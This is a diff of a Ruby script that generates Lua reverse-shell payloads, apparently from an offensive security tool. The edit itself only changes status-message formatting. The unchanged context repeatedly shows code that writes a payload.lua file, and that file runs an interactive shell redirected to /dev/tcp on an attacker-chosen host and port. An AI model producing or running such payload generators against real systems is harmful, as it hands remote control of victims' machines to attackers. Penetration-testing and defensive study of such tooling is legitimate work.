@@ -18,6 +18,7 @@
 #        You should have received a copy of the GNU General Public License
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
+i = "\033[1;77m[i] \033[0m"
 e = "\033[1;31m[-] \033[0m"
 p = "\033[1;77m[>] \033[0m"
 g = "\033[1;34m[*] \033[0m"
@@ -77,7 +78,7 @@ if File.directory? file
                 f.puts "require("os");"
                 f.puts "os.execute(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
             }
-            puts "#{s}Saved to #{file}!"
+            puts "#{i}Saved to #{file}."
         else
             file = "#{file}/payload.lua"
             sleep(0.5)
@@ -89,7 +90,7 @@ if File.directory? file
                 f.puts "require("os");"
                 f.puts "os.execute(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
             }
-            puts "#{s}Saved to #{file}!"
+            puts "#{i}Saved to #{file}."
         end
     else
         puts "#{e}Output directory: #{file}: does not exist!"
@@ -113,7 +114,7 @@ else
                 f.puts "require("os");"
                 f.puts "os.execute(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
             }
-            puts "#{s}Saved to #{file}!"
+            puts "#{i}Saved to #{file}."
         else
             puts "#{e}Error: #{direct}: not a directory!"
             abort()
